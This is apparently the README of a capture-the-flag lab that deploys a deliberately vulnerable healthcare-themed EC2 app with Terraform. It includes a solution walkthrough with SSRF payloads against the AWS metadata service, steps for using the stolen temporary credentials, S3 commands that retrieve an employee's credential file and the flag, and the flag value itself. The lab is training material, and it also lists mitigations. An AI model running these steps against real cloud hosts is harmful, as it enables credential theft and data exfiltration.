# Challenge 03 - AWS EC2 SSRF to S3 Access

## Overview

This challenge simulates a real-world scenario where a healthcare organization (MediCloudX Health) has deployed a web application with a Server-Side Request Forgery (SSRF) vulnerability. Participants must exploit this vulnerability to gain access to AWS credentials and ultimately retrieve sensitive data from S3 buckets.

## Challenge Description

**Scenario**: You've discovered the internal data analytics portal for MediCloudX Health, a telemedicine platform. The portal includes a connectivity checker tool that appears to be vulnerable to SSRF attacks. Your goal is to exploit this vulnerability to gain access to sensitive patient data.

**Difficulty**: Intermediate  
**Estimated Time**: 30-45 minutes  
**Skills Required**: SSRF exploitation, AWS metadata service, S3 access

## Architecture

The challenge deploys the following AWS resources:

- **EC2 Instance**: Runs a vulnerable PHP web application with SSRF vulnerability
- **IAM Roles**: EC2 instance role with S3 read permissions
- **IAM User**: `daniel.lopez` with access to the flag bucket
- **S3 Buckets**:
  - Credentials bucket: Contains daniel.lopez AWS credentials in CSV format
  - Flag bucket: Contains the final flag and decoy patient data
- **VPC**: Isolated network environment with public subnet

## Attack Flow

1. **Reconnaissance**: Access the MediCloudX Health data analytics portal
2. **Vulnerability Discovery**: Identify the SSRF vulnerability in the connectivity checker
3. **Bucket Discovery**: Use SSRF to access EC2 user-data or configuration files to discover bucket names
4. **Metadata Exploitation**: Use SSRF to access EC2 metadata service (`http://169.254.169.254/`)
5. **Credential Extraction**: Retrieve temporary AWS credentials from metadata service
6. **S3 Access**: Use EC2 credentials to access the credentials bucket
7. **Credential Escalation**: Download daniel.lopez credentials from CSV file
8. **Flag Retrieval**: Use daniel.lopez credentials to access the flag bucket and retrieve the flag

## Deployment

### Prerequisites

- Terraform >= 1.0
- AWS CLI configured with appropriate permissions
- AWS account with permissions to create EC2, IAM, S3, and VPC resources

### Deploy the Challenge

1. **Clone the repository and navigate to the challenge directory**:
   ```bash
   cd terraform/challenges/challenge-03-aws-only
   ```

2. **Copy and customize the variables file**:
   ```bash
   cp terraform.tfvars.example terraform.tfvars
   # Edit terraform.tfvars as needed
   ```

3. **Initialize and deploy**:
   ```bash
   terraform init
   terraform plan
   terraform apply
   ```

4. **Note the outputs**:
   ```bash
   terraform output
   ```

### Challenge Information

After deployment, participants will receive:
- **Web Application URL**: The public IP/URL of the MediCloudX Health portal
- **Challenge Instructions**: Basic scenario description

## Solution Walkthrough

### Step 1: Explore the Web Application

Access the provided URL to find the MediCloudX Health data analytics portal. The application includes:
- A connectivity checker tool for external services
- System status dashboard
- Professional healthcare-themed interface

### Step 2: Identify SSRF Vulnerability

The connectivity checker accepts any URL without validation, making it vulnerable to SSRF attacks.

### Step 3: Discover Bucket Names

First, use the SSRF vulnerability to discover the bucket names by accessing:

```
URL: http://169.254.169.254/latest/user-data
```

This will reveal the EC2 user-data script containing bucket configuration. Alternatively, check for configuration files:

```
URL: file:///opt/medicloudx/config.env
```

### Step 4: Access EC2 Metadata Service

Use the SSRF vulnerability to access the EC2 metadata service:

```
URL: http://169.254.169.254/latest/meta-data/
```

Explore the metadata to find:
- Instance identity
- IAM role information
- Security credentials

### Step 5: Extract Temporary Credentials

Access the security credentials endpoint:

```
URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
```

This returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token).

### Step 6: Configure AWS CLI

Use the extracted credentials to configure AWS CLI or use them programmatically:

```bash
export AWS_ACCESS_KEY_ID="[ACCESS_KEY]"
export AWS_SECRET_ACCESS_KEY="[SECRET_KEY]"
export AWS_SESSION_TOKEN="[TOKEN]"
```

### Step 7: Access Credentials Bucket

Use the bucket name discovered in Step 3 to access the credentials bucket:

```bash
aws s3 ls s3://[CREDENTIALS_BUCKET_NAME]
aws s3 cp s3://[CREDENTIALS_BUCKET_NAME]/employees/daniel.lopez/aws-credentials.csv ./
```

### Step 8: Extract daniel.lopez Credentials

The CSV file contains daniel.lopez's permanent AWS credentials.

### Step 9: Access Flag Bucket

Configure AWS CLI with daniel.lopez credentials and access the flag bucket using the bucket name from Step 3:

```bash
aws s3 ls s3://[FLAG_BUCKET_NAME]
aws s3 cp s3://[FLAG_BUCKET_NAME]/analytics/patient-insights/flag.txt ./
```

## Flag

```
CTF{m3d1cl0udx_ssrf_t0_s3_cr3d3nt14l_3xf1ltr4t10n}
```

## Learning Objectives

- Understanding SSRF vulnerabilities and their exploitation
- AWS EC2 metadata service security implications
- IAM role and policy misconfigurations
- S3 bucket security and access patterns
- Real-world cloud security attack chains

## Mitigation Strategies

1. **Input Validation**: Implement strict URL validation and allowlisting
2. **Network Segmentation**: Block access to metadata service from application layer
3. **IMDSv2**: Use Instance Metadata Service v2 with session tokens
4. **Least Privilege**: Apply minimal IAM permissions to EC2 roles
5. **Monitoring**: Implement logging and monitoring for unusual S3 access patterns

## Cleanup

To destroy the challenge resources:

```bash
terraform destroy
```

## Security Notes

- This challenge creates intentionally vulnerable infrastructure
- Only deploy in isolated/testing environments
- Ensure proper cleanup after use
- Monitor AWS costs during deployment

## Troubleshooting

### Common Issues

1. **EC2 Instance Not Accessible**: Check security group rules and VPC configuration
2. **SSRF Not Working**: Verify the web application is properly deployed
3. **S3 Access Denied**: Confirm IAM policies and bucket permissions
4. **Metadata Service Timeout**: Ensure EC2 instance has proper IAM role attached

### Debug Commands

```bash
# Check EC2 instance status
aws ec2 describe-instances --instance-ids [INSTANCE_ID]

# Verify IAM role attachment
aws ec2 describe-instances --instance-ids [INSTANCE_ID] --query 'Reservations[].Instances[].IamInstanceProfile'

# Test S3 bucket access
aws s3 ls s3://[BUCKET_NAME] --region us-east-1
```

## References

- [CloudGoat EC2 SSRF Scenario](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/ec2_ssrf)
- [AWS Instance Metadata Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
